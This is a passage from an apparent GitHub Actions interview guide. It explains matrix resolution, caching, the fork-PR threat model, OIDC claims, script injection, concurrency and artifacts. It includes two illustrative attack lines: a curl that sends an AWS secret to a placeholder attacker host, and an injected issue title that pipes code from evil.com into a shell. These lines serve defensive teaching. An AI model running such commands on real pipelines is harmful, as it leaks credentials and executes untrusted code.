Teardown is the security-relevant finale: `post` steps run in **reverse** registration order (LIFO), the `GITHUB_TOKEN` is revoked, logs are uploaded, and on a hosted runner the entire VM is discarded so no state survives to the next job. Knowing the `pre`/`main`/`post` model explains why caching, credential cleanup, and `actions/checkout`'s credential-removal all "just happen" at the right time — they're registered post-hooks, not magic.

#### Q26. [Theory] How does the matrix `include`/`exclude` algorithm actually resolve, and in what order?

The matrix is computed by a precise, order-sensitive algorithm, and most "why did I get this extra job?" confusion comes from not knowing it. Step one: take the **cartesian product** of all the base matrix vectors (the named arrays like `os` and `node`). Step two: apply `exclude` — any generated combination that matches *all* key/value pairs in an exclude entry is removed. Step three: apply `include` — and this is the subtle part — each `include` entry is evaluated against the *already-filtered* set.

For each `include` object, GitHub tries to find existing combinations it can **extend without overwriting** an original matrix value. If the include's keys that overlap with matrix dimensions match an existing job (and the *other* keys don't conflict with that job's matrix values), the include's extra keys are merged into that job. If no existing combination can absorb it, the include creates a **brand-new** job. Critically, `include` is applied *after* `exclude`, so you cannot exclude something and then resurrect it with include — but you *can* add a combination that exclude would have removed, because include adds new jobs rather than re-filtering.

```
base:  os=[linux,win]  node=[18,20]
        │  cartesian product
        ▼
 {linux,18} {linux,20} {win,18} {win,20}
        │  exclude: {os:win, node:18}
        ▼
 {linux,18} {linux,20} {win,20}
        │  include: {os:linux, node:18, npm:9}  ← extends matching job
        │  include: {node:22}                   ← matches all? merges into each
        │  include: {os:mac, node:21}           ← no match → NEW job
        ▼
 final job set
```

The truly counterintuitive case is an `include` with only keys that are *not* matrix dimensions (e.g. just `{npm: 9}`) — it merges into *every* existing combination. And an `include` whose overlapping keys match multiple jobs extends all of them. Being able to trace this product-then-exclude-then-include pipeline by hand is exactly what an interviewer probes when they hand you a tricky matrix and ask "how many jobs run, and what are their values?"

#### Q27. [Theory] Why are job outputs limited and string-typed, and how does that constrain cross-job communication?

Job outputs flow through a tightly constrained channel, and the constraints are a direct consequence of the isolated-runner architecture. Each job runs on a separate machine, so there is no shared memory or filesystem — the *only* structured channel back to the orchestrator is the job's declared `outputs`, which the runner serializes and ships when the job ends. Those outputs are always **strings**: there is no native list, map, or boolean type. A `true` you set is the string `"true"`, and consumers must compare against the string or coerce it.

This matters because of a real limitation: job outputs derived from step outputs are subject to size limits and are **not** masked even if built from secrets, so you must never route secrets through outputs. There's also the well-known gotcha that **matrix job outputs collide** — all legs of a matrix write to the same logical output name, so the value you read downstream is from whichever leg happened to finish last (effectively nondeterministic). To fan results back in deterministically you either use distinct output keys per matrix value, or you upload artifacts and have a downstream job aggregate them.

```yaml
jobs:
  plan:
    runs-on: ubuntu-latest
    outputs:
      changed: ${{ steps.diff.outputs.changed }}   # string "true"/"false"
    steps:
      - id: diff
        run: echo "changed=true" >> "$GITHUB_OUTPUT"
  build:
    needs: plan
    if: needs.plan.outputs.changed == 'true'        # compare as STRING
    runs-on: ubuntu-latest
    steps: [ { run: echo build } ]
```

The design trade-off: string-only, size-limited outputs keep the orchestrator's state model simple and serializable, but they push anything richer (large data, per-matrix-leg results, binaries) onto **artifacts**. The interview signal is recognizing that outputs are for small scalar control-flow values, artifacts are for data, and matrix + outputs is a trap unless you key them apart.

#### Q28. [Theory] How does `actions/cache` keying, restore-keys fallback, and cross-branch scoping actually work?

The cache action's behaviour is governed by three mechanisms that interact: the exact `key`, the ordered `restore-keys` prefixes, and Git **ref scoping**. On a cache *restore*, the action first looks for an exact match of `key`. If none exists, it walks `restore-keys` top to bottom, and for each it finds the *most recent* cache whose key **starts with** that prefix — a partial hit. A partial hit restores stale-but-useful contents (e.g. last week's `node_modules`) so the subsequent install only fetches the delta. On a cache *miss-then-success*, the action writes a new entry under the exact `key` in its `post` step — and only if that exact key didn't already exist (caches are immutable once written).

Ref scoping is the part people forget: caches are partitioned by branch. A job on a feature branch can read caches created on its own branch and on the **default branch** (and the PR's base), but it *cannot* read caches from arbitrary sibling branches. This prevents one branch from poisoning another and is why a brand-new branch gets a base-branch fallback but not a random teammate's cache.

```yaml
- uses: actions/cache@v4
  with:
    path: ~/.npm
    key:  npm-${{ runner.os }}-${{ hashFiles('**/package-lock.json') }}
    restore-keys: |
      npm-${{ runner.os }}-          # prefix fallback → newest match wins
```

```
restore order:  exact key ─▶ restore-keys[0] prefix ─▶ restore-keys[1] ...
scope visible:  this branch's caches  +  default-branch caches  (+ PR base)
write:          only on miss, in post step, immutable thereafter
eviction:       LRU once repo exceeds ~10 GB; 7-day untouched expiry
```

The trade-off to articulate: put the lockfile hash in the exact `key` so a dependency change *correctly invalidates* the cache, and use a stable prefix in `restore-keys` so you still get a warm start. Omitting `restore-keys` means every lockfile change is a full cold download; making the key too loose means you serve stale dependencies. And because writes are immutable, you can't "update" a cache — you bump the key.

#### Q29. [Theory] What is the difference between `if: success()`, `failure()`, `always()`, and `cancelled()`, and how does step/job status propagate?

These status-check functions read the **current run status** of the job (or the surrounding context) and decide whether a step or job executes. By default, every step has an implicit `if: success()` — it runs only if all *previous* steps succeeded. `failure()` runs the step only when a prior step has failed (your "on failure, post to Slack" handler). `always()` runs regardless of success, failure, *or* cancellation — useful for cleanup, but dangerously broad because it even runs on cancel. `cancelled()` is true specifically when the run was cancelled (e.g. by `cancel-in-progress` or a user).

The subtle internals: status is a *running aggregate*. Once any step fails, the job's status flips to "failure," and from that point every default-`if` step is skipped, but `failure()`/`always()` steps still fire. A step's own `continue-on-error: true` is different — it lets a step fail *without* flipping the job status, so downstream default steps keep running. There's also a precedence rule worth knowing: writing any explicit `if:` **removes** the implicit `success()`, so `if: github.ref == 'main'` will run even after a failure unless you write `if: success() && github.ref == 'main'`.

```
            runs when...        success  failure  cancelled
success()   no prior failure       ✓        ✗         ✗
failure()   a prior step failed    ✗        ✓         ✗
always()    unconditionally        ✓        ✓         ✓   ← also on cancel!
cancelled() run was cancelled      ✗        ✗         ✓
```

```yaml
steps:
  - run: ./build.sh
  - name: Notify on failure
    if: failure()
    run: ./notify.sh "build broke"
  - name: Cleanup (even if cancelled)
    if: always()
    run: ./cleanup.sh
```

The trade-off question interviewers like: "why not just use `always()` everywhere for cleanup?" Because `always()` also runs when the user cancels a run, which may not be what you want for, say, a deploy-finalize step — you often want `if: success() || failure()` (run on completion but **not** on cancel) instead. Knowing that distinction shows you understand cancellation as a first-class state, not just success/failure.

#### Q30. [Theory] How do `pre`, `main`, and `post` steps of an action work, and why does `actions/checkout` clean up credentials automatically?

Every JavaScript or Docker action can declare up to three entry points in its `action.yml`: `pre`, `main`, and `post`. `main` is the obvious one — the action's primary logic. `pre` runs *before* the job's steps begin (all `pre` hooks of all steps in the job run up front, in order), and `post` runs *after* the job's steps complete, in **reverse** order (LIFO). The runner registers these hooks when it parses the steps and schedules them around your `run` steps automatically.

This model is the hidden machinery behind several "magic" behaviours. `actions/cache` uses `main` to *restore* and `post` to *save* — that's why your cache is written even though you never wrote a save step. `actions/checkout` writes the `GITHUB_TOKEN` into the local git config as an auth header during `main`, then **removes it in its `post` step** — so by the time the job ends, the credential isn't lingering in `.git/config` where a later compromised step could read it. `setup-*` actions similarly persist their tooling cache in `post`.

```
job steps: [ checkout, setup-node, build, test ]

pre  (forward):   checkout.pre  setup-node.pre
main (forward):   checkout.main  setup-node.main  build  test
post (REVERSE):   test  build  setup-node.post  checkout.post
                                   (save cache)   (delete git creds)
```

The reverse-order `post` is not arbitrary — it mirrors stack unwinding so that resources are torn down in the opposite order they were set up, which keeps dependencies valid (you tear down the toolchain before the checkout that the toolchain may have relied on). The interview insight: when someone asks "where do my git credentials go?" or "how does the cache get saved without a save step?", the answer is the `pre`/`post` lifecycle — and knowing `post` runs even on failure (it's effectively `always()`) explains why cleanup is reliable.

#### Q31. [Theory] Why do fork pull requests get a read-only token and no secrets, while same-repo PRs get full access? What is the threat model?

The asymmetry exists because of a single, concrete threat: a PR can contain **arbitrary attacker-controlled code**, and CI executes that code. If a fork PR's workflow ran with secrets and a write token, any contributor on the internet could open a PR whose test script does `curl attacker.com -d "$AWS_SECRET"` and exfiltrate your credentials, or push malicious commits. So GitHub draws a trust boundary at the fork: for `pull_request` from a fork, the `GITHUB_TOKEN` is **read-only** and `secrets` are **empty/unavailable**. A PR from a branch *within* the same repository is assumed to come from someone who already has write access, so it gets the normal token and secrets.

The internals make this precise. On a fork PR, the workflow that runs is the one *from the base repository's default branch* (not the attacker's modified workflow file) — so an attacker can't simply edit `ci.yml` to grant themselves secrets. The job checks out the PR's code as untrusted *data*, runs it, but the *environment* it runs in is starved of privileges. This is also why first-time contributors require a maintainer to click "Approve and run" — the human is the gate before even the read-only run executes.

```
            same-repo PR              fork PR (pull_request)
Workflow     PR's version             base default branch's version
Token        read/write (per perms)   READ-ONLY
Secrets      available                NOT available
Approval     not needed               first-time contributor → maintainer approves
```

The design trade-off and its famous failure mode: people who *need* a privileged action on a fork PR reach for `pull_request_target`, which runs in the base-repo context *with* secrets and write token. That is safe only if you do **not** check out and execute the PR's code — the moment you `actions/checkout` the PR ref and run its build script under `pull_request_target`, you've handed an internet stranger your secrets. The whole fork model is "untrusted code, zero privileges"; the only correct way to grant privileges to fork contributions is *after* a human reviews them (merge to a protected branch, `workflow_run`, or an environment reviewer gate).

#### Q32. [Practical] What is the difference between `workflow_dispatch`, `repository_dispatch`, and `workflow_call`, and when do you reach for each?

All three are "manually/programmatically invoked" triggers, but they target different callers and shapes. `workflow_dispatch` is a **human/UI/API manual trigger** — it adds a "Run workflow" button and accepts typed `inputs` (string, boolean, choice, environment) so an operator can kick off a deploy or one-off task. `repository_dispatch` is a **webhook-style external trigger**: an outside system POSTs to the repo's dispatch API with a custom `event_type` and arbitrary JSON payload, letting a backend, another repo, or a chatops bot start a workflow. `workflow_call` makes a workflow **reusable** — it can only be invoked *by another workflow* via `uses:`, and it declares typed `inputs`, `outputs`, and `secrets`.

The distinguishing axis is *who can call it and how data arrives*. `workflow_dispatch` inputs come from a person filling a form (validated, enumerable choices). `repository_dispatch` inputs arrive as `github.event.client_payload.*` from an HTTP call (good for integrating external systems, but you must validate the payload yourself). `workflow_call` is the composition primitive — its inputs/outputs/secrets form a typed contract between workflows, enabling the "platform team owns the pipeline" pattern.

```
trigger             caller                    payload                use case
workflow_dispatch   human via UI/API/gh CLI   typed inputs (form)    manual ops, deploys
repository_dispatch external system (HTTP)    client_payload (JSON)  chatops, cross-system
workflow_call       another workflow (uses:)  inputs/outputs/secrets reusable pipelines
```

```yaml
on:
  workflow_dispatch:
    inputs:
      environment: { type: choice, options: [staging, production] }
  repository_dispatch:
    types: [deploy-requested]      # POST {"event_type":"deploy-requested", ...}
  workflow_call:
    inputs:
      image: { type: string, required: true }
    secrets:
      token: { required: true }
```

A common confusion is using `repository_dispatch` for cross-repo triggering when `workflow_dispatch` via the API (or a reusable `workflow_call`) would be cleaner. Reach for `repository_dispatch` specifically when a *non-GitHub-Actions* system needs to start a workflow with a custom payload; use `workflow_dispatch` for human-initiated runs; use `workflow_call` for in-Actions composition with a typed contract.

### 🟠 Advanced — extended

#### Q33. [Theory] What are the OIDC JWT claims GitHub emits, and how do `sub` formatting and `aud` shape a secure trust policy?

GitHub's OIDC token is a signed JWT whose **claims** are the entire basis of cloud trust, so understanding their structure is the difference between a tight policy and an org-wide hole. The token's issuer (`iss`) is `https://token.actions.githubusercontent.com`. The most important claim is `sub` (subject), whose *format varies by trigger context*: for a branch push it's `repo:ORG/REPO:ref:refs/heads/main`; for an environment deploy it's `repo:ORG/REPO:environment:production`; for a PR it's `repo:ORG/REPO:pull_request`; for a tag it's `repo:ORG/REPO:ref:refs/tags/v1`. The cloud's trust policy matches on `sub`, so you must know which format your job produces or the condition silently never matches (job hangs on auth failure) or matches too broadly.

The `aud` (audience) claim defaults to the cloud provider's URL but can be customized; AWS expects `sts.amazonaws.com`, and validating `aud` prevents a token minted for one audience being replayed against another. Beyond `sub`/`aud`, the token carries `repository`, `repository_owner`, `ref`, `environment`, `job_workflow_ref`, `runner_environment`, and more — and good trust policies pin **multiple** claims (e.g. require both `repository` and `environment`) so a single misconfiguration doesn't open the door.

```
Claim          Example value                              Use in trust policy
iss            token.actions.githubusercontent.com        provider identity
aud            sts.amazonaws.com                          replay protection
sub            repo:acme/app:environment:production       PRIMARY scoping key
repository     acme/app                                   secondary pin
environment    production                                 require for prod role
job_workflow_ref acme/ci/.github/workflows/deploy.yml@... pin to a reusable wf
```

The classic vulnerability: a `StringLike` condition on `sub` with a wildcard such as `repo:acme/*:*` trusts *every* workflow in *every* repo of the org — any developer can write a workflow that assumes prod. The hardened pattern uses `StringEquals` on an exact `sub`, or `StringLike` with the narrowest possible glob plus an additional `StringEquals` on `repository` and `environment`. The deep point: OIDC's security lives entirely in claim-matching discipline, and the variable `sub` format is the most common place people get it subtly wrong.

#### Q34. [Theory] Compare the three action types (JavaScript, Docker container, composite) on execution model, performance, and portability.

The three action authoring models trade off speed, isolation, and reach, and choosing wrong shows up as slow pipelines or "works on Linux only" surprises. A **JavaScript action** is compiled/bundled JS run by the runner's bundled Node directly on the host — it starts in milliseconds, runs on all OSes (Linux, Windows, macOS), and can use the `@actions/toolkit` libraries, but it must be authored in JS/TS and shipped as a committed bundle (`dist/`). A **Docker container action** runs your `ENTRYPOINT` inside a container the runner launches — you get a fully controlled, any-language environment, but it's **Linux-only**, pays an image build/pull cost (seconds to minutes), and the container runs as root with the workspace bind-mounted. A **composite action** is not a separate process at all — it's a packaged sequence of `run`/`uses` steps spliced into the calling job, so it inherits the job's OS and toolchain and adds essentially zero overhead.

```
                 JavaScript        Docker container    Composite
Execution        node on host      docker run          inlined steps in job
OS support       all               Linux only          all (host's OS)
Startup cost     ~instant          image build/pull    none
Language         JS/TS only        any                 shell + other actions
Isolation        none (host)       containerized        none (host)
Best for         cross-OS logic    custom toolchains    DRYing step sequences
```

The performance story is the usual deciding factor at scale: a Docker action that pulls a 1 GB image on every run can dominate a fast pipeline, whereas the same logic as a JS action or composite of `run` steps runs immediately. The portability story decides matrix builds: if you need the action to work on Windows and macOS legs, a Docker action is out. The interview-grade synthesis: prefer **composite** for "bundle these steps," **JavaScript** for "cross-platform reusable logic with inputs/outputs," and **Docker** only when you genuinely need a pinned, non-host toolchain — and then accept Linux-only and cold-start cost as the price.

#### Q35. [Theory] How does workflow nesting work for reusable workflows, and what are the limits and gotchas around `secrets: inherit` and context?

Reusable workflows can call other reusable workflows, but GitHub caps nesting at **four levels** (the top caller plus up to three nested `workflow_call`s), and a single workflow run can reference a bounded number of unique reusable workflows (on the order of 20). These limits exist because each nesting level is real orchestration state the service must track, and unbounded nesting would make runs unanalyzable and slow to plan.

The context semantics inside a reusable workflow are the deep gotcha. When workflow A calls reusable workflow B, B's `github` context still reflects the **original event and repository** of the *caller's* run — `github.repository`, `github.sha`, `github.event_name` are the top-level run's values, not B's repo. That's usually what you want (the deploy logic acts on the triggering repo) but surprises people who expect `github.repository` to be the reusable workflow's home repo (for that, use `github.workflow_ref` / `job_workflow_ref`). Secrets do **not** flow automatically: you either pass them explicitly under `secrets:` or use `secrets: inherit`, which forwards *all* of the caller's secrets to the callee.

```
caller.yml (level 1)
  └─ uses org/ci/.github/workflows/build.yml@sha   (level 2)
        └─ uses org/ci/.github/workflows/scan.yml@sha (level 3)
              └─ uses org/ci/.github/workflows/sign.yml@sha (level 4)  ← max
secrets:
  inherit            # forwards ALL caller secrets down one level
  # vs explicit:
  token: ${{ secrets.DEPLOY_TOKEN }}   # least-privilege, named only
```

`secrets: inherit` is convenient but a least-privilege smell — it hands the callee every secret the caller holds, so a compromised or sloppy nested workflow sees credentials it never needed. The hardened pattern is to pass only the named secrets each level requires. Another gotcha: `inherit` only flows *one level*; a deeply nested workflow doesn't transitively inherit unless each level re-inherits or re-passes. Articulating the 4-level cap, the caller-context rule, and the inherit-vs-explicit trade-off is what an interviewer is fishing for here.

#### Q36. [Theory] Explain script injection in `run` steps at a mechanical level. Why does the env-var indirection actually fix it?

Script injection happens because `${{ }}` interpolation is **textual substitution performed before the shell parses the script**. When you write `run: echo "Issue: ${{ github.event.issue.title }}"`, the runner literally pastes the issue title into the script *as source code*. If an attacker titles their issue `"; curl evil.com | sh; #`, the shell receives `echo "Issue: "; curl evil.com | sh; #"` — the injected commands run with your runner's privileges and token. The vulnerability is not a quoting bug you can fix with more quotes, because the attacker controls bytes that land *inside or outside* your quotes before quoting is even evaluated.

The fix is to move the untrusted value out of the *code* layer and into the *data* layer. By binding the expression to an environment variable and then referencing the **shell variable**, the untrusted string is passed to the shell as an environment value (data), and `"$TITLE"` is expanded by the shell at runtime *after* parsing — so it can never become executable tokens. The shell's own quoting now genuinely protects you because the dangerous content never touched the script's source text.

```yaml
# VULNERABLE: title is pasted into the script source
- run: echo "Issue: ${{ github.event.issue.title }}"

# SAFE: title travels as env DATA, shell expands "$TITLE" at runtime
- env:
    TITLE: ${{ github.event.issue.title }}
  run: echo "Issue: $TITLE"
```

```
${{ }} path:   GitHub  ──substitute as TEXT──▶  script source  ──▶ shell parses (attacker tokens execute)
env path:      GitHub  ──set as ENV value──▶  process env  ──▶ shell expands "$VAR" (data, never parsed as code)
```

The mechanical understanding generalizes: the same principle (don't let untrusted input reach a parser as code) is why you also avoid interpolating into `eval`, into action inputs that themselves run shells, or into `${{ }}` inside templated commands. Fields like `issue.title`, `pull_request.title`, branch names, and commit messages are all attacker-influenceable and must always go through the env-var indirection. Being able to explain *why* quoting alone fails and *why* env indirection works at the parse-time-vs-runtime level is the senior-level answer.

#### Q37. [Theory] How do path filters, branch filters, and `paths-ignore`/`branches-ignore` interact, and what are the negation and tag-vs-branch subtleties?

Filters on the `on:` triggers decide whether a workflow *starts at all*, and their precedence and glob semantics trip up even experienced engineers. You may specify `branches` **or** `branches-ignore` for an event, but **not both** — they're mutually exclusive; same for `paths`/`paths-ignore`. Within `branches`, later patterns can use `!` negation to carve exceptions, and **order matters**: a pattern only takes effect if it follows a positive match it overrides. So `[ 'release/**', '!release/**-beta' ]` matches release branches except beta ones, but flipping the order breaks the exclusion.

Path filtering compares the **changed files in the push/PR** against the globs: `paths` runs the workflow only if at least one changed file matches; `paths-ignore` skips the run if *all* changed files match the ignore globs. A crucial subtlety: path filters do not apply to tags, and on `pull_request` the comparison is against the PR's diff, not a single commit. Another sharp edge is "required status checks": if a workflow is skipped by a path filter but is marked required for merge, the PR can get stuck waiting for a check that will never report — the workaround is a companion workflow that reports success for the skipped case.

```yaml
on:
  push:
    branches:
      - 'main'
      - 'release/**'
      - '!release/**-beta'   # negation; must come AFTER the positive it refines
    paths:
      - 'src/**'
      - '!src/**/*.md'       # changes only to docs under src won't trigger
    tags:
      - 'v*'                 # tags: path filters are IGNORED for tag pushes
```

```
branches vs branches-ignore   → mutually exclusive (pick one)
paths    vs paths-ignore      → mutually exclusive (pick one)
! negation                    → order-dependent; refines a prior positive match
paths on PR                   → evaluated against the PR diff, not one commit
tags                          → path filters do not apply
skipped + required check      → PR can hang; use a status-reporting shim
```

The glob dialect is also worth knowing: `*` matches within a path segment, `**` crosses segments, and characters like `+`/`?` have meaning, so quote patterns. The interview depth here is recognizing that filters are an admission control layer (the run never starts, so there's no billing and no logs), that ignore/include are exclusive, that `!` is order-sensitive, and that path-filtered-out required checks are a real merge-blocking foot-gun.

#### Q38. [Theory] What guarantees do you actually have about concurrency groups, and what's the precise semantics of the pending/running slot model?

The `concurrency` key implements a deceptively simple state machine, and knowing its exact rules prevents both lost runs and stuck pipelines. A concurrency group is an arbitrary string; GitHub guarantees that **at most one run per group is `in_progress` at a time**, and at most **one** run can be `pending` (queued) behind it. The critical consequence: if a run is in progress and two more get queued, the *first* pending run is **cancelled** to make room for the newest — only the latest pending survives. So concurrency is not a FIFO queue of depth N; it's "one running + one waiting (the newest)."

`cancel-in-progress: true` changes the running slot's behaviour: a newer run *cancels the in-progress* run rather than waiting. `cancel-in-progress: false` (the default) makes the new run wait. This is why CI uses `true` (newest commit wins, kill the stale build) and deploys use `false` (let the rollout finish, queue the next). Concurrency can be set at the **workflow** level or the **job** level, and they're independent groups — a common pattern is workflow-level cancel for the build jobs but a job-level non-cancel group around the single deploy job.

```
group "deploy-prod", cancel-in-progress: false

run A in_progress ──▶ B queued (pending)
                       └─ C arrives ──▶ B CANCELLED, C becomes pending
A finishes ──▶ C promoted to in_progress
                       (B never ran — only newest pending survives)
```

```yaml
concurrency:
  group: ${{ github.workflow }}-${{ github.ref }}
  cancel-in-progress: ${{ github.ref != 'refs/heads/main' }}  # expressions allowed
```

The non-obvious guarantees and gaps: the group string is fully templatable with `${{ }}`, so you can scope per-branch, per-PR, or per-environment; a cancelled run reports a `cancelled` conclusion (not failure), which your downstream `if:` logic must account for; and there is **no ordering guarantee** for which of several simultaneously-arriving runs wins the pending slot beyond "newest displaces older." The senior insight is that concurrency is a coalescing mechanism, not a durable queue — if you need every event processed exactly once and in order, concurrency alone won't give it to you; you need an external queue or a single-flight job that drains work.

#### Q39. [Practical] How does artifact handling differ between v3 and v4, and why does the v4 immutability change matter?

The `upload-artifact`/`download-artifact` v4 rewrite changed the backend and the semantics in ways that break naive v3 patterns, so knowing the differences is both a migration and a design question. In **v3**, multiple jobs could upload to the *same artifact name* and the contents merged into one artifact; you could also upload incrementally. In **v4**, each artifact name must be **unique within a run** and an artifact is **immutable** once uploaded — a second upload with the same name **fails** rather than merging. v4 also made artifacts available **immediately** (you can download an artifact from a job that's still running, enabling new streaming patterns) and is significantly faster, but it dropped cross-run/backwards compatibility: **v4 and v3 artifacts cannot interoperate**, so you can't `download-artifact@v4` something uploaded by `@v3`.

The immutability change matters because the classic v3 matrix pattern — every matrix leg uploads to `coverage` and you download the merged blob — **breaks** in v4 (the second leg errors on the duplicate name). The v4 idiom is to give each leg a unique name (`coverage-${{ matrix.os }}-${{ matrix.node }}`), then use a downstream job with `download-artifact`'s `pattern:` and `merge-multiple:` to aggregate, or the dedicated merge action.

```yaml
# v4: unique name per matrix leg
- uses: actions/upload-artifact@v4
  with:
    name: coverage-${{ matrix.os }}-${{ matrix.python }}
    path: coverage.xml

# downstream aggregation
- uses: actions/download-artifact@v4
  with:
    pattern: coverage-*
    merge-multiple: true        # flatten many artifacts into one dir
```

```
                 v3                         v4
Same-name upload merges                     FAILS (immutable, unique name)
Availability     after job completes        immediately (mid-run downloadable)
Speed            slower                      up to ~10x faster
Interop          v3 only                    v4 only (no cross-version download)
Matrix pattern   upload to shared name      unique names + merge step
```

The deprecation timeline makes this urgent rather than academic: GitHub **retired v3 artifacts** (uploads/downloads stop working), so pipelines pinned to v3 silently fail after the cutoff. The interview-grade answer ties the *mechanical* change (immutability + unique names) to the *behavioural* break (matrix merge) and the *operational* driver (v3 retirement), and proposes the unique-name-plus-merge migration rather than just "bump the version."

#### Q40. [Theory] What is `GITHUB_STEP_SUMMARY`, how does it differ from logs, and what other special files/commands does the runner expose?

The runner exposes a set of **special files** (paths handed to your step via environment variables) and **workflow commands** (specially-formatted stdout lines) that are the sanctioned channels for talking back to the orchestrator — using them instead of ad-hoc parsing is what makes a step robust. `GITHUB_STEP_SUMMARY` is a file path; anything you append to it (Markdown) is rendered on the run's summary page, separate from the scrolling log. It's the right place for a human-readable test report, a coverage table, or a deploy URL — logs are for the play-by-play, the summary is for the headline.

The file-based commands replaced the older `::set-*` stdout commands precisely because writing to a file is not vulnerable to **log injection** (an attacker who controls log text could previously emit a fake `::set-output` line). The current file-based set: `GITHUB_OUTPUT` (step outputs), `GITHUB_ENV` (env for later steps), `GITHUB_PATH` (prepend to `PATH`), and `GITHUB_STEP_SUMMARY` (Markdown summary). A few stdout workflow commands remain for things that are inherently log-stream operations: `::add-mask::`, `::group::`/`::endgroup::`, `::error::`/`::warning::`/`::notice::` (annotations), and `::add-matcher::`.

```bash
echo "version=1.2.3"        >> "$GITHUB_OUTPUT"   # step output
echo "FLAG=on"              >> "$GITHUB_ENV"       # env for later steps
echo "$HOME/.local/bin"     >> "$GITHUB_PATH"      # extend PATH
echo "## Test Report"       >> "$GITHUB_STEP_SUMMARY"
echo "| pass | 142 |"       >> "$GITHUB_STEP_SUMMARY"
echo "::add-mask::$DERIVED"                         # mask a derived secret (stdout cmd)
echo "::error file=app.js,line=10::Null deref"      # annotation (stdout cmd)
```

```
File-based (preferred, injection-safe)   Stdout commands (stream operations)
GITHUB_OUTPUT     step outputs           ::add-mask::      hide a value
GITHUB_ENV        env for later steps    ::group:: / end   collapse log section
GITHUB_PATH       extend PATH            ::error/warning:: annotations on the run
GITHUB_STEP_SUMMARY  Markdown summary    ::add-matcher::   regex log → annotations
```

The deep point an interviewer wants: understanding *why* the model moved from stdout `::set-output::` to file-based `GITHUB_OUTPUT` (log-injection hardening), knowing that multi-line values use the heredoc delimiter syntax (`echo "k<<EOF" ... EOF`), and recognizing the step summary as a distinct surface from logs. Mentioning `::add-mask::` for derived secrets also closes the loop with the masking-only-matches-exact-strings limitation from the secrets question.

### 🔴 Expert — extended

#### Q41. [Theory] Trace exactly how GitHub decides which workflow file version runs for each event type. Why can this be a security boundary?

Which *version* of a workflow file executes is event-dependent, and the rule is a real security boundary that attackers probe. For most events the workflow definition is read from the **ref that triggered the event**: a `push` to `feature` runs `feature`'s copy of the workflow; a tag push runs the tag's copy. This is why you can iterate on a workflow on a branch and see your changes. For **`pull_request` from a fork**, however, GitHub runs the workflow file from the **base repository's default branch** — *not* the attacker's modified version — so a malicious contributor cannot edit `ci.yml` in their PR to grant themselves secrets or change permissions. For **`pull_request_target`**, `schedule`, and most non-PR events, the workflow also comes from the base/default branch context.

This split is the crux of the fork threat model. Because the *workflow* (the trusted control logic) comes from the base default branch while the *code* (untrusted) comes from the PR, an attacker can change what the build *does* (it's their code) but not the *privileges* the run holds (that's the base workflow + the fork's read-only token). Where this gets dangerous is `pull_request_target`: the trusted workflow runs with secrets, but if that trusted workflow checks out and executes the PR's code, the attacker's untrusted code now runs inside the privileged context.

```
Event                       Workflow file taken from      Code/context
push / tag                  the pushed ref                that ref (trusted-ish)
pull_request (same repo)    PR head ref                   PR (write-capable author)
pull_request (fork)         BASE default branch           PR code, READ-ONLY token, no secrets
pull_request_target         BASE default branch           BASE context, secrets, PR code if checked out
schedule / dispatch         default branch                default branch
```

The expert nuance: because `schedule` and `workflow_dispatch` always run from the default branch, a workflow change on a feature branch won't take effect for those triggers until merged — a frequent "why didn't my cron change apply?" puzzle. And the security takeaway is that the base-branch-sourcing of the workflow is *the* mechanism preventing fork PRs from privilege-escalating; any feature (like `pull_request_target`) that reunites the trusted-workflow context with untrusted PR code re-opens the hole, which is precisely why GitHub documents it with prominent warnings.

#### Q42. [Theory] How would you reason about and break ties between billing, queueing, and runner-group selection in a large self-hosted ARC deployment?

At org scale, "where does this job run and what does it cost?" becomes a layered routing decision, and an expert can trace the resolution order. When a job dispatches, GitHub matches its `runs-on` **labels** against available runners. With self-hosted, labels plus **runner groups** (org-level partitions with repo-access policies) determine the eligible pool; if multiple runners match, GitHub assigns to an idle one, and if none are idle the job **queues** until one frees up or, with Actions Runner Controller (ARC), until the controller scales up a new ephemeral pod. Billing diverges here: GitHub-hosted minutes are metered (with multipliers for larger/Windows/macOS runners), while self-hosted compute is *your* cloud bill — Actions only charges for the orchestration, not the runner minutes.

The tie-breaking and starvation issues are what bite large deployments. If many repos share one runner group with a fixed pool, a noisy repo can starve others — the queue is roughly FIFO per eligible pool but there's no fair-share scheduler across repos, so you partition with **multiple runner groups** scoped by team/sensitivity and size each pool to its workload. ARC's autoscaling reacts to pending jobs, but cold-start latency (pod schedule + image pull + runner registration) adds seconds-to-minutes, so for latency-sensitive lanes you keep a warm minimum replica count, trading idle cost for responsiveness.

```
job dispatch
   │ runs-on labels
   ▼
match runner group(s) the repo may use  ──▶ idle runner? ──yes──▶ assign
   │ no idle                                              │
   ▼                                                       ▼
queue ──▶ ARC sees pending ──▶ scale up ephemeral pod ──▶ register ──▶ assign
                                   (cold start: schedule + pull + register)

cost:  hosted = metered minutes (×multiplier)   self-hosted = your infra + Actions orchestration
```

The expert trade-offs to articulate: ephemeral single-use runners (one job per pod, then destroyed) are mandatory for security (no state bleed, no secret persistence) but multiply cold starts versus reusable runners — you mitigate with pre-pulled images, warm pools, and node over-provisioning. Sensitive workloads get isolated runner groups with restrictive repo policies so a low-trust repo can never schedule onto a high-trust runner. And you watch concurrency limits at the *account* level (max concurrent jobs) which can throttle even when you have spare runners. The signal is treating runner selection as a scheduling/routing problem with cost, isolation, and latency as the competing objectives — not just "add more runners."

#### Q43. [Theory] Explain the timing and re-evaluation semantics of job-level `if`, `needs`, and conditional `needs` results (success/failure/skipped) in a complex DAG.

In a multi-job DAG, the rules for whether a job runs combine `needs` (the dependency edges) with the job's `if`, and the interaction is where complex pipelines misbehave. A job becomes *eligible* only after **all** jobs in its `needs` have reached a terminal state. By default, a job runs only if **all** of its `needs` **succeeded** — there's an implicit success gate on the dependencies, layered on top of the implicit `success()` of the job's own `if`. If any needed job fails or is skipped, the dependent is **skipped** (not failed) — and that skip cascades to *its* dependents.

The expert-level subtlety is overriding that gate. Writing an explicit `if:` on a job that uses status functions (`always()`, `failure()`, `!cancelled()`) **removes** the implicit "all needs succeeded" requirement, so the job can run even when an upstream failed — but then you must inspect `needs.<job>.result` yourself (`'success' | 'failure' | 'cancelled' | 'skipped'`) to decide what to do. This is exactly how you build a "final report" or "cleanup" job that runs no matter what upstream did, or a "deploy only if build succeeded but allow flaky-lint to fail" gate.

```yaml
jobs:
  lint:  { runs-on: ubuntu-latest, steps: [ { run: exit 1 } ] }  # fails
  build: { runs-on: ubuntu-latest, steps: [ { run: echo ok } ] }
  report:
    needs: [lint, build]
    if: always()                       # runs even though lint failed
    runs-on: ubuntu-latest
    steps:
      - run: |
          echo "lint=${{ needs.lint.result }}"    # failure
